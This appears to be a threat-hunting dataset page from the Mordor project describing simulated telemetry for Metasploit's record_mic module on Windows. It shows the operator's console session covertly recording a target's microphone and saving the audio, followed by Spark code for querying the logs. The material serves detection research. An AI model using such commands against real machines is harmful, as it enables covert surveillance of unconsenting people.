# MSF Record Microphone

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-200609225055 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2020/06/09 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Metasploit |
| Simulation Script | https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/multi/manage/record_mic.rb |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/collection/msf_record_mic.zip |

## Dataset Description
This dataset represents adversaries accessing the microphone of an endpoint.

## Adversary View
```
msf5 exploit(multi/handler) > use post/multi/manage/record_mic
msf5 post(multi/manage/record_mic) > set SESSION 2
SESSION => 2
msf5 post(multi/manage/record_mic) > info

      Name: Multi Manage Record Microphone
    Module: post/multi/manage/record_mic
  Platform: Linux, OSX, Windows
      Arch: 
      Rank: Normal

Provided by:
  sinn3r <sinn3r@metasploit.com>

Compatible session types:
  Meterpreter

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  DURATION  5                no        Number of seconds to record
  SESSION   2                yes       The session to run this module on.

Description:
  This module will enable and record your target's microphone. For 
  non-Windows targets, please use Java meterpreter to be able to use 
  this feature.

msf5 post(multi/manage/record_mic) > run

[*] 172.18.39.6 - 20%...
[*] 172.18.39.6 - 40%...
[*] 172.18.39.6 - 60%...
[*] 172.18.39.6 - 80%...
[*] 172.18.39.6 - 100%...
[*] 172.18.39.6 - Audio size: (55169 bytes)
[+] 172.18.39.6 - Audio recording saved: /home/msf/.msf4/loot/20200610025201_default_172.18.39.6_172.18.39.6.audi_358712.wav
[*] Post module execution completed
msf5 post(multi/manage/record_mic) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/collection/msf_record_mic.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT channel, COUNT(1)
FROM mordorTable
GROUP BY channel
    '''
)
df.show(10,False)
        